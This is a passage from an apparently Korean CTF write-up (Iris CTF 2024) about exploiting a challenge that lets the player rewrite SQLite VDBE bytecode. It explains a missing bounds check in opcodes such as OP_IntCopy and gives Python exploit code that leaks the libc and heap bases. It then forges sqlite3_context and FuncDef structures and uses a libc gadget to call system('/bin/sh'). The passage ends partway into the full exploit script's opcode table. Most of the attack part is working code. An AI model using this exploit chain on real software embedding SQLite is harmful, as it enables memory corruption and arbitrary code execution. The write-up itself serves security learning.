</span></span><span style="display:flex;"><span>  pOut <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p2];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sqlite3VdbeMemSetInt64</span>(pOut, pIn1<span style="color:#f92672">-&gt;</span>u.i);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>기본적으로 prepare로 점화된 바이트 코드를 신뢰하기 때문에 별도의 boundary check가 없다.
그래서 memory에 대한 Out of bound read가 가능해진다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sqlite3_value
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  MemValue u;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>z;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> n;
</span></span><span style="display:flex;"><span>  u16 flags;
</span></span><span style="display:flex;"><span>  u8 enc;
</span></span><span style="display:flex;"><span>  u8 eSubtype;
</span></span><span style="display:flex;"><span>  sqlite3 <span style="color:#f92672">*</span>db;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> szMalloc;
</span></span><span style="display:flex;"><span>  u32 uTemp;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>zMalloc;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xDel)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>그런데 약간 성가신게 메모리 배열의 하나의 원소가 sqlite3_value라서 0x38의 배수 단위로만 메모리 액세스가 가능했다.</p>
<h3 id="mem_dumppy">mem_dump.py<a hidden class="anchor" aria-hidden="true" href="#mem_dumppy">#</a></h3>
<p>실제 메모리 구조체의 첫 8바이트만 액세스가 가능하니 유효한 주소를 유출할 수 있도록 0x38의 배수 단위로 탐색을 진행했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> gdb
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
</span></span><span style="display:flex;"><span>y <span style="color:#f92672">=</span> int(input(<span style="color:#e6db74">&#39;base sqliteMem: &#39;</span>),<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>inf <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>selected_inferior()
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">200</span>):
</span></span><span style="display:flex;"><span>    mem <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&lt;Q&#39;</span>,inf<span style="color:#f92672">.</span>read_memory(y<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span><span style="color:#f92672">*</span>i, <span style="color:#ae81ff">0x8</span>))
</span></span><span style="display:flex;"><span>    print(hex(y<span style="color:#f92672">-</span><span style="color:#ae81ff">0x38</span><span style="color:#f92672">*</span>i) <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;(</span><span style="color:#e6db74">{</span><span style="color:#f92672">-</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">)&#39;</span> <span style="color:#f92672">+</span><span style="color:#e6db74">&#39; : &#39;</span> <span style="color:#f92672">+</span> hex(mem[<span style="color:#ae81ff">0</span>]))
</span></span></code></pre></div><p>`</p>
<h3 id="memory-leak">Memory leak<a hidden class="anchor" aria-hidden="true" href="#memory-leak">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;SELECT &#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0x20</span>):
</span></span><span style="display:flex;"><span>  payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;(SELECT </span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">),&#39;</span><span style="color:#f92672">.</span>encode()
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>prepare(<span style="color:#ae81ff">1</span>,payload)
</span></span><span style="display:flex;"><span>pc <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> compile(OP_Init, <span style="color:#ae81ff">0</span>, pc) <span style="color:#75715e"># jmp to pc</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Integer,<span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_IntCopy, (<span style="color:#f92672">-</span><span style="color:#ae81ff">146</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_ResultRow, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>) <span style="color:#75715e"># p2 = col count</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Halt)
</span></span><span style="display:flex;"><span>modify_opcode(<span style="color:#ae81ff">1</span>, payload)
</span></span><span style="display:flex;"><span>exec_q(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21ace0</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(hex(libc_base))
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OP_SCopy         = 81# /* synopsis: r[P2]=r[P1]                      */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OP_IntCopy       = 82# /* synopsis: r[P2]=r[P1]                      */
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> compile(OP_Init, <span style="color:#ae81ff">0</span>, pc) <span style="color:#75715e"># jmp to pc</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Integer,<span style="color:#ae81ff">0x1</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_IntCopy, (<span style="color:#f92672">-</span><span style="color:#ae81ff">0xb8</span>)<span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_ResultRow, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>) <span style="color:#75715e"># p2 = col count</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> compile(OP_Halt)
</span></span><span style="display:flex;"><span>modify_opcode(<span style="color:#ae81ff">1</span>, payload)
</span></span><span style="display:flex;"><span>exec_q(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> int(p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">0x14578</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(hex(heap_base))
</span></span></code></pre></div><p>일부러 SELECT 하고 서브 쿼리를 많이 추가해서 nOps를 늘린 상태에서 opcode를 수정했다.</p>
<h3 id="code-execution">Code Execution<a hidden class="anchor" aria-hidden="true" href="#code-execution">#</a></h3>
<p>Code execution전에 먼저 memory에 연속적으로 원하는 데이터를 쓸 수 있어야한다.
sqlite3의 blob 데이터 타입을 이용하면 heap 영역에 연속적으로 데이터를 쓸 수 있다.</p>
<p>위 primitive를 이용해서 객체의 주소를 변조하고 그 객체의 virtual function call을 가로채는 방법이 충분히 가능할 것이라고 생각했다.
<img loading="lazy" src="/blog/Iris_CTF_2024/4c13312725e9b4bea13e24821d31e71c.png" alt=""  />

모든 Opcode를 살펴봤지만, vfcall(controllable_rdi)의 꼴인 함수 호출이 존재하지 않았다.
one gadget을 사용하지 않고 좀 더 안정적인 익스플로잇을 위해서 구조체 변조가 쉽고 가능한 많은 인자가 컨트롤 가능한 Opcode를 찾았다.
<img loading="lazy" src="/blog/Iris_CTF_2024/a8c22933bee2f8898b000b36116a0342.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> OP_PureFunc:              <span style="color:#75715e">/* group */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> OP_Function: {            <span style="color:#75715e">/* group */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i;
</span></span><span style="display:flex;"><span>  sqlite3_context <span style="color:#f92672">*</span>pCtx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( pOp<span style="color:#f92672">-&gt;</span>p4type<span style="color:#f92672">==</span>P4_FUNCCTX );
</span></span><span style="display:flex;"><span>  pCtx <span style="color:#f92672">=</span> pOp<span style="color:#f92672">-&gt;</span>p4.pCtx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* If this function is inside of a trigger, the register array in aMem[]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ** might change from one evaluation to the next.  The next block of code
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ** checks to see if the register array has changed, and if so it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  ** reinitializes the relevant parts of the sqlite3_context object */</span>
</span></span><span style="display:flex;"><span>  pOut <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p3];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( pCtx<span style="color:#f92672">-&gt;</span>pOut <span style="color:#f92672">!=</span> pOut ){
</span></span><span style="display:flex;"><span>    pCtx<span style="color:#f92672">-&gt;</span>pVdbe <span style="color:#f92672">=</span> p;
</span></span><span style="display:flex;"><span>    pCtx<span style="color:#f92672">-&gt;</span>pOut <span style="color:#f92672">=</span> pOut;
</span></span><span style="display:flex;"><span>    pCtx<span style="color:#f92672">-&gt;</span>enc <span style="color:#f92672">=</span> encoding;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span>pCtx<span style="color:#f92672">-&gt;</span>argc<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">--</span>) pCtx<span style="color:#f92672">-&gt;</span>argv[i] <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>aMem[pOp<span style="color:#f92672">-&gt;</span>p2<span style="color:#f92672">+</span>i];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( pCtx<span style="color:#f92672">-&gt;</span>pVdbe<span style="color:#f92672">==</span>p );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memAboutToChange</span>(p, pOut);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ifdef SQLITE_DEBUG
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span>(i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span>pCtx<span style="color:#f92672">-&gt;</span>argc; i<span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span>( <span style="color:#a6e22e">memIsValid</span>(pCtx<span style="color:#f92672">-&gt;</span>argv[i]) );
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">REGISTER_TRACE</span>(pOp<span style="color:#f92672">-&gt;</span>p2<span style="color:#f92672">+</span>i, pCtx<span style="color:#f92672">-&gt;</span>argv[i]);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">MemSetTypeFlag</span>(pOut, MEM_Null);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( pCtx<span style="color:#f92672">-&gt;</span>isError<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>pCtx<span style="color:#f92672">-&gt;</span>pFunc<span style="color:#f92672">-&gt;</span>xSFunc)(pCtx, pCtx<span style="color:#f92672">-&gt;</span>argc, pCtx<span style="color:#f92672">-&gt;</span>argv);<span style="color:#75715e">/* IMP: R-24505-23230 */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* If the function returned an error, throw an exception */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>( pCtx<span style="color:#f92672">-&gt;</span>isError ){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( pCtx<span style="color:#f92672">-&gt;</span>isError<span style="color:#f92672">&gt;</span><span style="color:#ae81ff">0</span> ){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sqlite3VdbeError</span>(p, <span style="color:#e6db74">&#34;%s&#34;</span>, <span style="color:#a6e22e">sqlite3_value_text</span>(pOut));
</span></span><span style="display:flex;"><span>      rc <span style="color:#f92672">=</span> pCtx<span style="color:#f92672">-&gt;</span>isError;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sqlite3VdbeDeleteAuxData</span>(db, <span style="color:#f92672">&amp;</span>p<span style="color:#f92672">-&gt;</span>pAuxData, pCtx<span style="color:#f92672">-&gt;</span>iOp, pOp<span style="color:#f92672">-&gt;</span>p1);
</span></span><span style="display:flex;"><span>    pCtx<span style="color:#f92672">-&gt;</span>isError <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( rc ) <span style="color:#66d9ef">goto</span> abort_due_to_error;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( (pOut<span style="color:#f92672">-&gt;</span>flags<span style="color:#f92672">&amp;</span>MEM_Str)<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>       <span style="color:#f92672">||</span> pOut<span style="color:#f92672">-&gt;</span>enc<span style="color:#f92672">==</span>encoding
</span></span><span style="display:flex;"><span>       <span style="color:#f92672">||</span> db<span style="color:#f92672">-&gt;</span>mallocFailed );
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">assert</span>( <span style="color:#f92672">!</span><span style="color:#a6e22e">sqlite3VdbeMemTooBig</span>(pOut) );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">REGISTER_TRACE</span>(pOp<span style="color:#f92672">-&gt;</span>p3, pOut);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">UPDATE_MAX_BLOBSIZE</span>(pOut);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>조건도 heap base를 알고 있으므로 아주 쉽게 우회가 가능하다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> sqlite3_context {
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pOut;              <span style="color:#75715e">/* The return value is stored here */</span>
</span></span><span style="display:flex;"><span>  FuncDef <span style="color:#f92672">*</span>pFunc;         <span style="color:#75715e">/* Pointer to function information */</span>
</span></span><span style="display:flex;"><span>  Mem <span style="color:#f92672">*</span>pMem;              <span style="color:#75715e">/* Memory cell used to store aggregate context */</span>
</span></span><span style="display:flex;"><span>  Vdbe <span style="color:#f92672">*</span>pVdbe;            <span style="color:#75715e">/* The VM that owns this context */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iOp;                <span style="color:#75715e">/* Instruction number of OP_Function */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> isError;            <span style="color:#75715e">/* Error code returned by the function. */</span>
</span></span><span style="display:flex;"><span>  u8 enc;                 <span style="color:#75715e">/* Encoding to use for results */</span>
</span></span><span style="display:flex;"><span>  u8 skipFlag;            <span style="color:#75715e">/* Skip accumulator loading if true */</span>
</span></span><span style="display:flex;"><span>  u8 argc;                <span style="color:#75715e">/* Number of arguments */</span>
</span></span><span style="display:flex;"><span>  sqlite3_value <span style="color:#f92672">*</span>argv[<span style="color:#ae81ff">1</span>]; <span style="color:#75715e">/* Argument set */</span>
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> FuncDef {
</span></span><span style="display:flex;"><span>  i8 nArg;             <span style="color:#75715e">/* Number of arguments.  -1 means unlimited */</span>
</span></span><span style="display:flex;"><span>  u32 funcFlags;       <span style="color:#75715e">/* Some combination of SQLITE_FUNC_* */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>pUserData;     <span style="color:#75715e">/* User data parameter */</span>
</span></span><span style="display:flex;"><span>  FuncDef <span style="color:#f92672">*</span>pNext;      <span style="color:#75715e">/* Next function with same name */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xSFunc)(sqlite3_context<span style="color:#f92672">*</span>,<span style="color:#66d9ef">int</span>,sqlite3_value<span style="color:#f92672">**</span>); <span style="color:#75715e">/* func or agg-step */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xFinalize)(sqlite3_context<span style="color:#f92672">*</span>);                  <span style="color:#75715e">/* Agg finalizer */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xValue)(sqlite3_context<span style="color:#f92672">*</span>);                     <span style="color:#75715e">/* Current agg value */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> (<span style="color:#f92672">*</span>xInverse)(sqlite3_context<span style="color:#f92672">*</span>,<span style="color:#66d9ef">int</span>,sqlite3_value<span style="color:#f92672">**</span>); <span style="color:#75715e">/* inverse agg-step */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>zName;   <span style="color:#75715e">/* SQL name of the function. */</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">union</span> {
</span></span><span style="display:flex;"><span>    FuncDef <span style="color:#f92672">*</span>pHash;      <span style="color:#75715e">/* Next with a different name but the same hash */</span>
</span></span><span style="display:flex;"><span>    FuncDestructor <span style="color:#f92672">*</span>pDestructor;   <span style="color:#75715e">/* Reference counted destructor function */</span>
</span></span><span style="display:flex;"><span>  } u; <span style="color:#75715e">/* pHash if SQLITE_FUNC_BUILTIN, pDestructor otherwise */</span>
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>system(&quot;/bin/sh&quot;)를 호출하기 위해서는 한번의 code reuse가 필요하다.
<img loading="lazy" src="/blog/Iris_CTF_2024/982080be44d41031a8a5a18e65d1bdee.png" alt=""  />

호출시에 rdi == rax이고 rdi는 현재 객체이다.
그래서 다음과 같은 가젯을 이용한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000009097f</span> <span style="color:#f92672">:</span> mov rdi, qword ptr [rdi <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>] ; call qword ptr [rax <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x360</span>]
</span></span></code></pre></div><p>위 가젯을 이용해서 자기 자신 객체를 다시 참조해서 rdi를 수정하고 호출한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># sqlite3_context</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#75715e"># scopy 0x18</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(mem_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># Mem * pOut &lt;- Mem[0] address, p3 must be 0</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(payload_start<span style="color:#f92672">+</span><span style="color:#ae81ff">0x38</span>) <span style="color:#75715e"># FuncDef *pFunc</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(payload_start <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>) <span style="color:#75715e"># /bin/sh</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p8(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> p8(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">5</span> <span style="color:#75715e"># argc = 1</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># argv *</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># FuncDef</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">*</span><span style="color:#ae81ff">3</span> 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x000000000009097f</span>) 
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x360</span> <span style="color:#f92672">-</span> len(payload))
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc_base <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system<span style="color:#f92672">-</span><span style="color:#ae81ff">0x46e</span>) <span style="color:#75715e"># do_system + 2</span>
</span></span></code></pre></div><h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>OP_Savepoint     <span style="color:#f92672">=</span>  <span style="color:#ae81ff">0</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_AutoCommit    <span style="color:#f92672">=</span>  <span style="color:#ae81ff">1</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Transaction   <span style="color:#f92672">=</span>  <span style="color:#ae81ff">2</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Checkpoint    <span style="color:#f92672">=</span>  <span style="color:#ae81ff">3</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_JournalMode   <span style="color:#f92672">=</span>  <span style="color:#ae81ff">4</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Vacuum        <span style="color:#f92672">=</span>  <span style="color:#ae81ff">5</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_VFilter       <span style="color:#f92672">=</span>  <span style="color:#ae81ff">6</span><span style="color:#75715e"># /* jump, synopsis: iplan=r[P3] zplan=&#39;P4&#39;     */</span>
</span></span><span style="display:flex;"><span>OP_VUpdate       <span style="color:#f92672">=</span>  <span style="color:#ae81ff">7</span><span style="color:#75715e"># /* synopsis: data=r[P3@P2]                    */</span>
</span></span><span style="display:flex;"><span>OP_Init          <span style="color:#f92672">=</span>  <span style="color:#ae81ff">8</span><span style="color:#75715e"># /* jump, synopsis: Start at P2                */</span>
</span></span><span style="display:flex;"><span>OP_Goto          <span style="color:#f92672">=</span>  <span style="color:#ae81ff">9</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Gosub         <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_InitCoroutine <span style="color:#f92672">=</span> <span style="color:#ae81ff">11</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Yield         <span style="color:#f92672">=</span> <span style="color:#ae81ff">12</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_MustBeInt     <span style="color:#f92672">=</span> <span style="color:#ae81ff">13</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Jump          <span style="color:#f92672">=</span> <span style="color:#ae81ff">14</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Once          <span style="color:#f92672">=</span> <span style="color:#ae81ff">15</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_If            <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_IfNot         <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_IsType        <span style="color:#f92672">=</span> <span style="color:#ae81ff">18</span><span style="color:#75715e"># /* jump, synopsis: if typeof(P1.P3) in P5 goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_Not           <span style="color:#f92672">=</span> <span style="color:#ae81ff">19</span><span style="color:#75715e"># /* same as TK_NOT, synopsis: r[P2]= !r[P1]    */</span>
</span></span><span style="display:flex;"><span>OP_IfNullRow     <span style="color:#f92672">=</span> <span style="color:#ae81ff">20</span><span style="color:#75715e"># /* jump, synopsis: if P1.nullRow then r[P3]=NULL, goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_SeekLT        <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_SeekLE        <span style="color:#f92672">=</span> <span style="color:#ae81ff">22</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_SeekGE        <span style="color:#f92672">=</span> <span style="color:#ae81ff">23</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_SeekGT        <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_IfNotOpen     <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span><span style="color:#75715e"># /* jump, synopsis: if( !csr[P1] ) goto P2     */</span>
